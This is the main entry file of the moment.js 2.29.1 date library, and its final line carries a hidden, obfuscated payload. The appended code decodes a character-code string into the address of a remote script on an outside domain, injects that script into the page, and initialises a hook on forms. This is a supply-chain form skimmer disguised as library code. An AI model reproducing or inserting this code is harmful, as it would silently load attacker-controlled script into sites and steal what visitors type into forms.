//! moment.js
//! version : 2.29.1
//! authors : Tim Wood, Iskren Chernev, Moment.js contributors
//! license : MIT
//! momentjs.com

import { hooks as moment, setHookCallback } from './lib/utils/hooks';

moment.version = '2.29.1';

import {
    min,
    max,
    now,
    isMoment,
    momentPrototype as fn,
    createUTC as utc,
    createUnix as unix,
    createLocal as local,
    createInvalid as invalid,
    createInZone as parseZone,
} from './lib/moment/moment';

import { getCalendarFormat } from './lib/moment/calendar';

import {
    defineLocale,
    updateLocale,
    getSetGlobalLocale as locale,
    getLocale as localeData,
    listLocales as locales,
    listMonths as months,
    listMonthsShort as monthsShort,
    listWeekdays as weekdays,
    listWeekdaysMin as weekdaysMin,
    listWeekdaysShort as weekdaysShort,
} from './lib/locale/locale';

import {
    isDuration,
    createDuration as duration,
    getSetRelativeTimeRounding as relativeTimeRounding,
    getSetRelativeTimeThreshold as relativeTimeThreshold,
} from './lib/duration/duration';

import { normalizeUnits } from './lib/units/units';

import isDate from './lib/utils/is-date';

setHookCallback(local);

moment.fn = fn;
moment.min = min;
moment.max = max;
moment.now = now;
moment.utc = utc;
moment.unix = unix;
moment.months = months;
moment.isDate = isDate;
moment.locale = locale;
moment.invalid = invalid;
moment.duration = duration;
moment.isMoment = isMoment;
moment.weekdays = weekdays;
moment.parseZone = parseZone;
moment.localeData = localeData;
moment.isDuration = isDuration;
moment.monthsShort = monthsShort;
moment.weekdaysMin = weekdaysMin;
moment.defineLocale = defineLocale;
moment.updateLocale = updateLocale;
moment.locales = locales;
moment.weekdaysShort = weekdaysShort;
moment.normalizeUnits = normalizeUnits;
moment.relativeTimeRounding = relativeTimeRounding;
moment.relativeTimeThreshold = relativeTimeThreshold;
moment.calendarFormat = getCalendarFormat;
moment.prototype = fn;

// currently HTML5 input type only supports 24-hour formats
moment.HTML5_FMT = {
    DATETIME_LOCAL: 'YYYY-MM-DDTHH:mm', // <input type="datetime-local" />
    DATETIME_LOCAL_SECONDS: 'YYYY-MM-DDTHH:mm:ss', // <input type="datetime-local" step="1" />
    DATETIME_LOCAL_MS: 'YYYY-MM-DDTHH:mm:ss.SSS', // <input type="datetime-local" step="0.001" />
    DATE: 'YYYY-MM-DD', // <input type="date" />
    TIME: 'HH:mm', // <input type="time" />
    TIME_SECONDS: 'HH:mm:ss', // <input type="time" step="1" />
    TIME_MS: 'HH:mm:ss.SSS', // <input type="time" step="0.001" />
    WEEK: 'GGGG-[W]WW', // <input type="week" />
    MONTH: 'YYYY-MM', // <input type="month" />
};

export default moment;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b